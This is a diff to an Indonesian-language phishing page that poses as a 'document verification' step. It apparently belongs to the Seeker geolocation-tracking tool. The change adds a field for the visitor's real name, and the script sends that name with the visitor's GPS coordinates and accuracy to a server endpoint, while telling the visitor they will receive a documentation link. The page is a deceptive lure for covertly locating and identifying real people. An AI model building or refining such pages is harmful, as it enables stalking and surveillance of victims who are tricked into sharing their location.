@@ -14,34 +14,56 @@
       font-size: 16px;
       background: #3c78da;
       color: white;
-      border: add;
+      border: none;
       border-radius: 6px;
+    }
+    input {
+      padding: 10px;
+      font-size: 16px;
+      width: 300px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
     }
   </style>
 </head>
 <body>
   <h2>Verifikasi Dokumen</h2>
-  <p>Klik tombol di bawah untuk mendapatkan link dokumentasi.</p>
-  <p>Klik Allow untuk mendapatkan Link</p>
+  <p>Masukkan nama asli Anda dan klik tombol di bawah untuk mendapatkan link dokumentasi.</p>
+
+  <!-- Form Input Nama -->
+  <input type="text" id="name" placeholder="Masukkan Nama Asli" />
+
+  <!-- Tombol untuk memulai tracking -->
   <button onclick="startTracking()">Dapatkan Link</button>
 
   <script>
     function startTracking() {
-      // Panggil fungsi dari Seeker
+      var name = document.getElementById('name').value;
+
+      if (!name) {
+        alert("Mohon isi nama asli terlebih dahulu.");
+        return;
+      }
+
+      // Panggil fungsi dari Seeker untuk mengambil lokasi
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendData, showError);
+        navigator.geolocation.getCurrentPosition(function(position) {
+          sendData(position, name);
+        }, showError);
       } else {
         alert("Browser Anda tidak mendukung GPS.");
       }
     }
 
-    function sendData(position) {
+    function sendData(position, name) {
       fetch('/api/location', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
+          name: name,
           lat: position.coords.latitude,
           lon: position.coords.longitude,
           acc: position.coords.accuracy
